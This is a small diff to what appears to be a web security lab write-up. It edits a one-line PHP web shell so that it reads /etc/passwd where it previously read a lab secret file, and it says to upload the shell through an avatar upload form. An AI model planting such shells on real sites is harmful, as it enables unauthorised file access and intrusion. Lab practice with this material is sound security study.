@@ -50,7 +50,7 @@ https://github.com/user-attachments/assets/7609cb29-77e0-4a77-a9b1-eeead8232ff4
 Create a simple PHP web shell:
 
 ```php
-<?php echo file_get_contents('/home/carlos/secret'); ?>
+<?php echo file_get_contents('/etc/passwd'); ?>
 ```
 
 Upload the file using the avatar upload functionality.
